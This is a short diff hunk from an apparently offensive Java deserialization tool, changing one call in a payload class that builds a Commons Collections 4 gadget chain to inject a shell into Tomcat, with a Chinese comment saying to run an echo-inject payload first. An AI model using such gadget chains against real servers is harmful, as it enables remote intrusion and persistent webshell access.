@@ -26,7 +26,7 @@ public class CommonsCollections4ForTomcatShellInject implements ObjectPayload<Qu
 
 	public Queue<Object> getObject(final String ... command) throws Exception {
         //todo 需要先使用 CommonsCollections4ForTomcatEchoInject 打一遍，再用这个打
-		Object templates = Gadgets.createTemplatesImpl(null, TomcatShellInject.class);
+		Object templates = Gadgets.createTemplatesImpl(TomcatShellInject.class);
 
 		ConstantTransformer constant = new ConstantTransformer(String.class);
 
